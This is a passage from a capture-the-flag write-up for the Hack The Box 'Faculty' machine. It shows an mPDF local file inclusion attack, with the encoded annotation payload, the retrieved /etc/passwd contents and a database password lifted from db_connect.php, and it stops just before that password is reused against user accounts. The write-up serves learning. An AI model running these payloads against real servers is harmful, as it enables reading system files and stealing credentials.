font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>Mathematics<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">small</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>Mathematics<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">small</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tr</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tr</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>3<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>English<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">small</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>English<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">small</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tr</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tr</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>4<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>Computer Hardware<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">small</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>Computer Hardware<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">small</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tr</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tr</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>5<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>History<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text-center"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">small</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>History<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">b</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">small</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">td</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tr</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tboby</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">table</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p>Can we exploit this by editing the content somehow?</p>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>Download a PDF and analyze it using <code>exiftool</code> and we find it’s created using <code>mPDF 6.0</code>:</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  faculty exiftool OKYKcSDLWNQjVuybnHRm0XG6vr.pdf </span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ExifTool</span> Version Number         : 12.44</span>
<span id="cb7-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> Name                       : OKYKcSDLWNQjVuybnHRm0XG6vr.pdf</span>
<span id="cb7-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Directory</span>                       : .</span>
<span id="cb7-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> Size                       : 1781 bytes</span>
<span id="cb7-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> Modification Date/Time     : 2022:08:26 09:47:42+02:00</span>
<span id="cb7-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> Access Date/Time           : 2022:08:26 09:48:08+02:00</span>
<span id="cb7-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> Inode Change Date/Time     : 2022:08:26 09:47:57+02:00</span>
<span id="cb7-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> Permissions                : <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-rw-r--r--</span></span>
<span id="cb7-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> Type                       : PDF</span>
<span id="cb7-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> Type Extension             : pdf</span>
<span id="cb7-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MIME</span> Type                       : application/pdf</span>
<span id="cb7-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PDF</span> Version                     : 1.4</span>
<span id="cb7-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Linearized</span>                      : No</span>
<span id="cb7-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Page</span> Count                      : 1</span>
<span id="cb7-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Page</span> Layout                     : OneColumn</span>
<span id="cb7-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Producer</span>                        : mPDF 6.0</span>
<span id="cb7-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Create</span> Date                     : 2022:08:26 08:46:03+01:00</span>
<span id="cb7-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Modify</span> Date                     : 2022:08:26 08:46:03+01:00</span></code></pre></div>
<p>Googling for mPDF exploits we find <a href="https://packetstormsecurity.com/files/167897/mPDF-7.0-Local-File-Inclusion.html">this LFI python script</a> that helps us create a base64 payload to be sent to the victim. As a PoC try to grab <code>/etc/passwd</code>:</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  faculty ./mpdf-lfi.py </span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&gt;</span> /etc/passwd</span>
<span id="cb8-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Replace the content with the payload below</span>
<span id="cb8-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Url</span> encoded payload:</span>
<span id="cb8-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">%3Cannotation%20file%3D%22/etc/passwd%22%20content%3D%22/etc/passwd%22%20icon%3D%22Graph%22%20title%3D%22Attached%20File%3A%20/etc/passwd%22%20pos-x%3D%22195%22%20/%3E</span></span>
<span id="cb8-6"></span>
<span id="cb8-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Base64</span> encoded payload:</span>
<span id="cb8-8"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">JTNDYW5ub3RhdGlvbiUyMGZpbGUlM0QlMjIvZXRjL3Bhc3N3ZCUyMiUyMGNvbnRlbnQlM0QlMjIvZXRjL3Bhc3N3ZCUyMiUyMGljb24lM0QlMjJHcmFwaCUyMiUyMHRpdGxlJTNEJTIyQXR0YWNoZWQlMjBGaWxlJTNBJTIwL2V0Yy9wYXNzd2QlMjIlMjBwb3MteCUzRCUyMjE5NSUyMiUyMC8lM0U</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span></span></code></pre></div>
<p>Send the base64 payload with Burp to create a new pdf. <img src="https://exploit.se/posts/2022-08-26-htb-writeup-faculty/images/faculty07.png" class="img-fluid"></p>
<p>Add the filename to the base URL <code>http://faculty.htb/mpdf/tmp/</code> do see the PDF. In the left corner you’ll see a green dot indicator on the sidebar, press it got to “Show Attachments” and download the file <code>passwd</code>. <img src="https://exploit.se/posts/2022-08-26-htb-writeup-faculty/images/faculty08.png" class="img-fluid"></p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  faculty cat passwd </span>
<span id="cb9-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root:x:0:0:root:/root:/bin/bash</span></span>
<span id="cb9-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></span>
<span id="cb9-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span></span>
<span id="cb9-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span></span>
<span id="cb9-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sync:x:4:65534:sync:/bin:/bin/sync</span></span>
<span id="cb9-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span></span>
<span id="cb9-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span></span>
<span id="cb9-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span></span>
<span id="cb9-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span></span>
<span id="cb9-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span></span>
<span id="cb9-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span></span>
<span id="cb9-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span></span>
<span id="cb9-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span></span>
<span id="cb9-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span></span>
<span id="cb9-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">list:x:38:38:Mailing</span> List Manager:/var/list:/usr/sbin/nologin</span>
<span id="cb9-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span></span>
<span id="cb9-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gnats:x:41:41:Gnats</span> Bug-Reporting System <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:/var/lib/gnats:/usr/sbin/nologin</span></span>
<span id="cb9-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span></span>
<span id="cb9-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">systemd-network:x:100:102:systemd</span> Network Management,,,:/run/systemd:/usr/sbin/nologin</span>
<span id="cb9-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">systemd-resolve:x:101:103:systemd</span> Resolver,,,:/run/systemd:/usr/sbin/nologin</span>
<span id="cb9-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">systemd-timesync:x:102:104:systemd</span> Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span>
<span id="cb9-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span></span>
<span id="cb9-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span></span>
<span id="cb9-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span></span>
<span id="cb9-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tss:x:106:111:TPM</span> software stack,,,:/var/lib/tpm:/bin/false</span>
<span id="cb9-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span></span>
<span id="cb9-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span></span>
<span id="cb9-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span></span>
<span id="cb9-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span></span>
<span id="cb9-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sshd:x:111:65534::/run/sshd:/usr/sbin/nologin</span></span>
<span id="cb9-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">systemd-coredump:x:999:999:systemd</span> Core Dumper:/:/usr/sbin/nologin</span>
<span id="cb9-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span></span>
<span id="cb9-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mysql:x:112:117:MySQL</span> Server,,,:/nonexistent:/bin/false</span>
<span id="cb9-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash</span></span>
<span id="cb9-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin</span></span>
<span id="cb9-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer:x:1001:1002:,,,:/home/developer:/bin/bash</span></span>
<span id="cb9-38"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">usbmux:x:114:46:usbmux</span> daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span></code></pre></div>
<p>We got LFI!</p>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>Lets see if we can find any sensitive files; <code>id_rsa</code> would be optimal but we aren’t able to access either <code>gbyolo</code> or <code>developer</code>’s. We can start to look for any files containing the database connection and hopefully be able to extract credentials from there. Start by grabbing <code>manage_user.php</code> that we found earlier, and the very top gives us the database connection file; <code>db_connect.php</code>.</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode php code-with-copy"><code class="sourceCode php"><span id="cb10-1"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&lt;?php</span> </span>
<span id="cb10-2"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">include</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'db_connect.php'</span>)<span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">session_start</span>()<span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-4"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span>(<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">isset</span>(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$_GET</span>[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'id'</span>])){</span>
<span id="cb10-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$user</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$conn</span>-&gt;query(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"SELECT * FROM users where id ="</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">mysql_real_escape_string</span>(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$_GET</span>[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'id'</span>]))<span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-6"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">foreach</span>(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$user</span>-&gt;fetch_array() <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">as</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$k</span> =&gt;<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$v</span>){</span>
<span id="cb10-7">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$meta</span>[<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$k</span>] <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$v</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-8">}</span>
<span id="cb10-9">}</span>
<span id="cb10-10"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">?&gt;</span></span></code></pre></div>
<p>Download <code>db_connect.php</code> and bingo, we got a password!</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode php code-with-copy"><code class="sourceCode php"><span id="cb11-1"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&lt;?php</span> </span>
<span id="cb11-2"></span>
<span id="cb11-3"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$conn</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">new</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">mysqli</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'localhost'</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'sched'</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Co.met06aci.dly53ro.per'</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'scheduling_db'</span>)<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">or</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">die</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Could not connect to mysql"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">mysqli_error</span>(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$con</span>))<span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">;</span></span></code></pre></div>
<p>Try to login with found password against user <code>gbyolo</code> and/or <code>developer</code>:</p>
